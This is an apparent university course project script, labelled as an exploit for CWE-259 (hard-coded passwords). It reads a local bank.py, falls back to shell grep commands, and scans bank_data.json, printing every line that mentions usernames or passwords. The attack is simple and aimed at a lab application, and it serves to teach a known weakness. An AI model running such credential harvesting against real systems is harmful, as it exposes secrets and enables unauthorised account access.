#CPSC 525 Final Project F25
#CWE 259 Hard-coded passwords
#Exploit Application

import subprocess

#Boolean in case first exploit fails
nextexploit = False

#Try reading from file
try:
    file = open("bank.py","r") 
    found_matches = False
    for linenumber, line in enumerate(file, 1):
            if "admin" in line and "username" in line and "password" in line:
                print(f"Found: {line.strip()}")
                found_matches = True
    if not found_matches:
        print("No hard coded usernames or passwords found. Trying next exploit.")
        nextexploit = True
    file.close()

except:
    print ("File was not readable, trying next exploit")
    nextexploit = True

#If file not readable, attempt to extract username and password using shell commands
if nextexploit:
    try:
        result = subprocess.run("grep -i username bank.py", shell=True, capture_output=True, encoding="utf-8", text=True)
        print("Usernames:")
        print(result.stdout)

        result = subprocess.run("grep -i password bank.py", shell=True, capture_output=True, encoding="utf-8", text=True)
        print("Passwords:")
        print(result.stdout)
    except Exception as e:
        print("Exploit failed:", e)

#Try reading from database
try:
    file = open("bank_data.json","r") 
    found_matches = False
    for linenumber, line in enumerate(file, 1):
            if "username" in line or "password" in line:
                print(f"Found: {line.strip()}")
                found_matches = True
    if not found_matches:
        print("No hard coded usernames or passwords found in database.")
    file.close()

except:
    print ("Database file was not readable")